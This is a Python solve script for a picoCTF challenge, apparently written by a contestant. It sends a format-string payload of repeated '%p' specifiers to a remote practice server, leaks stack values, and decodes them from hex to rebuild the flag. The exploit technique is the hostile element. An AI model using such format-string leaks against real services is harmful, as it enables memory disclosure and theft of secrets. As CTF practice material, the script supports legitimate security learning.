#!/usr/bin/env python
#!CMD: ./solve.py

from pwn import *
from chepy import Chepy


p = remote("mimas.picoctf.net", 55618)

payload = "%p,"*35
p.sendline(payload.encode())
# p.interactive()
p.recvuntil(b"your order: ")
data = p.recvuntil(b"\nBye!").decode()
p.close()

data = data.split("\n")[0]

data = data.split(",")
for _ in range(data.count("(nil)")): data.remove("(nil)")
for _ in range(data.count("")): data.remove("")


parsed_data = []

for piece in data:
    try:
        d = Chepy(piece).from_hex().out
        d = str(d, "utf-8")
        parsed_data.append(d)
    except:
        pass

for section in parsed_data[:]:
    if "{" in section: break
    parsed_data.remove(section)
parsed_data = parsed_data[::-1]


for section in parsed_data[:]:
    if "}" in section: break
    parsed_data.remove(section)
parsed_data = parsed_data[::-1]


flag = "".join([i[::-1] for i in parsed_data])
print(f"{flag=}")
